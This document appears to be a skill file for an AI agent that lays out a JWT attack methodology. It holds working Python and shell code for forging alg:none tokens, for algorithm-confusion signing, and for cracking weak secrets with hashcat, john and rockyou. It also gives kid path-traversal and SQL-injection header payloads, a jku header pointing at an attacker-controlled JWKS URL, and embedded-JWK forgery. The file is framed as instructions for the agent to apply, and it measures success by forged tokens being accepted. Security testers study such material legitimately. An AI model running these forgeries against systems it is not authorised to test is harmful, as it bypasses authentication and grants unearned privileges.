---
name: jwt-attack-methodology
description: "JWT attack methodology: algorithm confusion, weak secrets, claim tampering, and key injection. Use this skill when authentication uses JSON Web Tokens."
---

# JWT Attacks

## Overview

A JWT is `base64url(header).base64url(payload).signature`. Every attack targets the gap between what the server verifies and what it trusts.

## Decode

```bash
python3 -c "
import base64,sys
t=sys.argv[1].split('.')
for p in t[:2]: print(base64.urlsafe_b64decode(p+'='*(-len(p)%4)).decode())
" eyJhbGciOi...
```

```bash
jwt_tool TOKEN -d
```

## Attack 1 — alg:none

```python
import base64, json
def b64(o): return base64.urlsafe_b64encode(json.dumps(o).encode()).rstrip(b"=").decode()
h = b64({"alg": "none", "typ": "JWT"})
p = b64({"sub": "admin", "role": "admin"})
print(f"{h}.{p}.")
```

Variants: `none`, `None`, `NONE`, `nOnE`.

## Attack 2 — algorithm confusion (RS256 → HS256)

If the server verifies with a public key but accepts HS256, sign with the public key as the HMAC secret.

```python
import jwt
pub = open("public.pem").read()
token = jwt.encode({"sub": "admin"}, pub, algorithm="HS256")
```

## Attack 3 — weak secret

```bash
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
# or
john --format=HMAC-SHA256 jwt.txt --wordlist=rockyou.txt
```

```python
import jwt
for k in open("rockyou.txt", encoding="latin1"):
    try:
        jwt.decode(token, k.strip(), algorithms=["HS256"]); print("key:", k); break
    except Exception: pass
```

## Attack 4 — kid injection

`kid` selects the key. Path traversal or SQLi in `kid`:

```json
{"alg": "HS256", "kid": "../../../../dev/null"}
```

Server loads an empty file as the key → sign with an empty string.

```json
{"alg": "HS256", "kid": "key1' UNION SELECT 'secret'-- -"}
```

## Attack 5 — jku / x5u

Point the key URL at an attacker-controlled JWKS:

```json
{"alg": "RS256", "jku": "https://attacker/jwks.json"}
```

If the server fetches it without an allowlist, you control the signing key.

## Attack 6 — claim tampering without signature check

Some libraries decode without verifying if `verify=False` or a misconfigured middleware. Change `role`/`sub` and send.

## Attack 7 — expired token acceptance

Servers that skip `exp` validation. Reuse an old token with modified claims.

## Attack 8 — embedded JWK

```json
{"alg": "RS256", "jwk": {"kty":"RSA", "n":"...", "e":"AQAB"}}
```

If the server trusts the embedded key, sign with the matching private key.

## Verification

The forged token must be accepted and grant the privileges it claims.
